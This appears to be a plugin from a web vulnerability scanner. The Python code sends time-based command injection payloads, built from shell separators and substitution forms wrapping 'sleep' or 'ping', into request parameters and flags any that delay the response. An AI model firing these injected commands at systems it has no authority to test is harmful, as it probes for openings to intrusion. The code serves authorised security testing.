import re, itertools, time
from utils.requester import *
from threading import Thread, Semaphore
from config import *


tech = "Time Based Command Injection"
prefixs = (";", "|", "||", "&&")
cmds    = ("sleep %d" % SLEEP, "ping -c 50 127.0.0.1",)
suffixs = ("", "||",)
payloads = []
for pre, cmd, suf in itertools.product(prefixs, cmds, suffixs):
    payloads.append(f"{pre}{cmd}")
embeds = ("$({})", "`{}`")
for embed, cmd in itertools.product(embeds, cmds):
    payloads.append(embed.format(cmd))

def exec(data):
    for pos, payload in itertools.product(POSITIONS, payloads):
        for parameter in data[pos].keys():
            t1 = time.time()
            r = single_request(data, pos, parameter, payload)
            # print(r.text)
            if (time.time() - t1) > SLEEP:
                print(f"■■■{tech}■■■{pos}■■■{parameter}■■■{payload}■■■")
                return True
